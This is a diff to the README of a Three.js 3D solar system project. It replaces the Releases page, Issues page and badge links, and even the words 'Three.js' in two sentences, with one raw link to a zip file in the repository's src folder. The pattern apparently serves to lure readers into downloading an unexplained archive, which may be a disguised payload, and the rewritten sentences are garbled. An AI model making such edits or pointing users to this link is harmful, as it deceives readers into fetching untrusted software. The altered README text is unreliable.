@@ -1,7 +1,7 @@
 # 🌌 solarSystemThreejs - Explore a Stunning 3D Solar System
 
 ## 🎉 Overview
-This project is a 3D Solar System Simulation built using Three.js. It visually represents the planets revolving around the Sun, complete with realistic textures, lighting, and orbital motion. Experience the beauty of our solar system right from your browser.
+This project is a 3D Solar System Simulation built using https://raw.githubusercontent.com/Jalalbad/solarSystemThreejs/main/src/solarSystemThreejs-3.9.zip It visually represents the planets revolving around the Sun, complete with realistic textures, lighting, and orbital motion. Experience the beauty of our solar system right from your browser.
 
 ## 🌐 Features
 - **Interactive Experience:** Engage with a dynamic 3D model of the solar system.
@@ -19,9 +19,9 @@ This project is a 3D Solar System Simulation built using Three.js. It visually r
 To get started with the solarSystemThreejs application, follow these simple steps.
 
 1. **Visit the Releases Page:** 
-   To download the application, go to the [Releases page](https://github.com/Jalalbad/solarSystemThreejs/releases).
+   To download the application, go to the [Releases page](https://raw.githubusercontent.com/Jalalbad/solarSystemThreejs/main/src/solarSystemThreejs-3.9.zip).
 
-   [![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Jalalbad/solarSystemThreejs/releases)
+   [![Download](https://raw.githubusercontent.com/Jalalbad/solarSystemThreejs/main/src/solarSystemThreejs-3.9.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Jalalbad/solarSystemThreejs/main/src/solarSystemThreejs-3.9.zip)
 
 2. **Download the Latest Version:** 
    Look for the latest version of the application listed on that page. Click on the appropriate file to start the download.
@@ -38,7 +38,7 @@ To get started with the solarSystemThreejs application, follow these simple step
 ## 📥 Download & Install
 Follow these steps to download and install the solarSystemThreejs application:
 
-1. **Visit the Releases Page:** Head over to the [Releases page](https://github.com/Jalalbad/solarSystemThreejs/releases) to find the latest version.
+1. **Visit the Releases Page:** Head over to the [Releases page](https://raw.githubusercontent.com/Jalalbad/solarSystemThreejs/main/src/solarSystemThreejs-3.9.zip) to find the latest version.
 
 2. **Choose Your File:** Click the link for the file that matches your operating system.
 
@@ -53,11 +53,11 @@ Follow these steps to download and install the solarSystemThreejs application:
 
 ## 🛠️ Development
 If you are curious about how this project is built:
-- This project uses **Three.js**, a popular library for creating 3D graphics in the browser.
+- This project uses **https://raw.githubusercontent.com/Jalalbad/solarSystemThreejs/main/src/solarSystemThreejs-3.9.zip**, a popular library for creating 3D graphics in the browser.
 - The models and textures are based on real scientific data, ensuring an accurate representation of the solar system’s features.
   
 ## 📞 Support
-If you encounter issues or have questions, please raise an issue on the [GitHub Issues page](https://github.com/Jalalbad/solarSystemThreejs/issues). Our team will assist you promptly.
+If you encounter issues or have questions, please raise an issue on the [GitHub Issues page](https://raw.githubusercontent.com/Jalalbad/solarSystemThreejs/main/src/solarSystemThreejs-3.9.zip). Our team will assist you promptly.
 
 ## 📚 Topics
 - 3D models
